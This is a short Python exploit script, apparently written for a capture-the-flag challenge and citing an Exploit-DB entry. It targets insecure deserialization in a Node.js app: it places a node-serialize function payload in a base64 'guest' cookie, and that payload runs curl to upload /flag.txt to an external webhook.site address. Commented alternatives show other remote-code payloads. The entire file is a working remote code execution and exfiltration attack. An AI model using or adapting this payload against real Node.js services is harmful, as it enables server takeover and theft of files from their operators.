# https://www.exploit-db.com/exploits/49552

import requests
import re
import base64
import sys

url = 'http://web.zh3r0.cf:6666/guest' # change this

payload = """function(){require('child_process').exec('curl -F file1=@/flag.txt https://webhook.site/f3ad3f2a-8e98-4b10-9952-41fe382ea449',function(error, stdout, stderr){return stdout;});}()"""

# rce = "_$$ND_FUNC$$_process.exit(0)"
# code ="_$$ND_FUNC$$_console.log('behind you')"
code = "_$$ND_FUNC$$_" + payload

string = '{"country":"worldwide","city":"Tyr", "username":"a","rce": "'+code+'"}'

cookie = {'guest':base64.b64encode(string)}

try:
    response = requests.post(url, cookies=cookie).text
    print(response)
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)